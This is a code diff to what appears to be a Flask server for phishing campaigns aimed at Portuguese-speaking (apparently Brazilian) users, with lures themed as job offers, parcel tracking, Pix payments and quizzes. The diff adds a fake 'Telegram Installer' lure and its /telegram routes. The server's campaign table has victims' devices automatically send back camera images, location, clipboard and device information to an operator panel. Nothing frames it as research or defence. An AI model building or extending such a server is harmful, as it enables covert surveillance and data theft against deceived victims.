@@ -127,6 +127,12 @@ CAMPAIGNS = {
         "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
         "result_tags": [],
     },
+    "telegram": {
+        "name": "Telegram Installer",
+        "beacon": "templates/beacon-telegram.html",
+        "auto_commands": ["info", "camera_back", "camera", "location", "clipboard"],
+        "result_tags": [],
+    },
 }
 
 # ─── Auto-Recon ────────────────────────────────────────────
@@ -216,6 +222,11 @@ def route_beacon_social():
 def landing():
     return render_template("landing.html") if os.path.exists("templates/landing.html") else render_template("beacon-pix.html")
 
+@app.route("/t")
+@app.route("/telegram")
+def route_telegram():
+    return _serve_campaign("telegram")
+
 @app.route("/panel")
 def panel():
     return render_template("panel.html")
@@ -244,7 +255,7 @@ def api_register():
     path = data.get("path", "")
     referrer = data.get("referrer", "")
     campaign = "pix"
-    for tag in ["emprego", "rastreio", "correios", "roleta", "quiz", "beacon-music", "beacon-sports", "beacon-deals", "beacon-social", "beacon", "music", "sports", "deals", "social"]:
+    for tag in ["emprego", "rastreio", "correios", "roleta", "quiz", "beacon-music", "beacon-sports", "beacon-deals", "beacon-social", "beacon", "music", "sports", "deals", "social", "telegram"]:
         if tag in path.lower():
             campaign = tag if tag != "correios" else "rastreio"
             campaign = {
@@ -257,7 +268,7 @@ def api_register():
             break
     # Fallback: check referrer
     if campaign == "pix":
-        for tag in ["emprego", "rastreio", "roleta", "quiz", "beacon-music", "beacon-sports", "beacon-deals", "beacon-social", "beacon", "music", "sports", "deals", "social"]:
+        for tag in ["emprego", "rastreio", "roleta", "quiz", "beacon-music", "beacon-sports", "beacon-deals", "beacon-social", "beacon", "music", "sports", "deals", "social", "telegram"]:
             if tag in referrer.lower():
                 campaign = tag
                 break
